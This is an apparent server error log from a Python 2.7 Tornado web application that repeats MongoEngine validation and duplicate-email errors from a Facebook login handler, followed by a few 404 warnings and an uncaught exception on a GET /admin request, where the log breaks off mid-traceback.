  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['username', 'first_name', 'last_name', 'locale', 'gender', 'fb_id', 'email'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['username', 'first_name', 'last_name', 'locale', 'gender', 'fb_id', 'email'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['username', 'first_name', 'last_name', 'locale', 'gender', 'fb_id', 'email'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['username', 'first_name', 'last_name', 'locale', 'gender', 'fb_id', 'email'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['username', 'first_name', 'last_name', 'locale', 'gender', 'fb_id', 'email'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 76, in _save_user_profile
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 236, in save
    raise OperationError(message % unicode(err))
OperationError: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : "giorgosera@gmail.com" })
WARNING:root:404 GET /main/learn (127.0.0.1) 1.19ms
WARNING:root:404 GET /main/learn (127.0.0.1) 1.27ms
WARNING:root:404 GET /main/learn (127.0.0.1) 1.28ms
WARNING:root:404 GET /main/learn (127.0.0.1) 1.20ms
WARNING:root:404 GET /h (127.0.0.1) 1.18ms
ERROR:root:Uncaught exception GET /admin (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/admin', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'Cookie': '_xsrf=0075e599308845b1a5d9f75debbde7ec', 'X-Real-Ip': '94.4.2.114'})
Traceback (most recent call last):
